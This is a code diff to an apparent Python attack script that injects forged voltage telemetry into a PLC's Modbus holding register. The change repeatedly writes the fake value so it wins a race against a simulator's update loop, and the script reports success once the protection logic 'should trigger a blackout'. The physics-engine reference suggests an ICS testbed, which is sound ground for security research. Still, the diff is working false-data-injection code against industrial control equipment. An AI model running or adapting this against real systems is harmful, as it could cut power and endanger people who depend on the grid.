@@ -33,17 +33,21 @@ def main():
     # Scale the voltage according to the Multiplier Method (x 100)
     scaled_voltage = int(args.voltage * 100)
     
-    print(f"[*] Injecting scaled voltage value: {scaled_voltage} to Holding Register 0 (%MW0)")
+    print(f"[*] Injecting scaled voltage value: {scaled_voltage} to Holding Register 1024 (%MW0)")
     
     try:
-        # Write to Modbus Holding Register 0
-        response = client.write_register(0, scaled_voltage)
-        
-        if response.isError():
-            print(f"[-] ERROR: Failed to write to register. {response}")
-        else:
-            print(f"[+] ATTACK SUCCESSFUL: Faked voltage telemetry set to {args.voltage}V")
-            print("[+] The PLC protection logic should trigger a blackout immediately.")
+        import time
+        # Spam the register for 2.5 seconds to ensure we win the race condition 
+        # against the physics engine's 500ms update loop.
+        for i in range(50):
+            response = client.write_register(1024, scaled_voltage)
+            if response.isError():
+                print(f"[-] ERROR: Failed to write to register. {response}")
+                break
+            time.sleep(0.05)
+            
+        print(f"[+] ATTACK SUCCESSFUL: Spammed faked voltage telemetry ({args.voltage}V)")
+        print("[+] The PLC protection logic should trigger a blackout immediately.")
             
     except Exception as e:
         print(f"[-] EXCEPTION during Modbus communication: {e}")
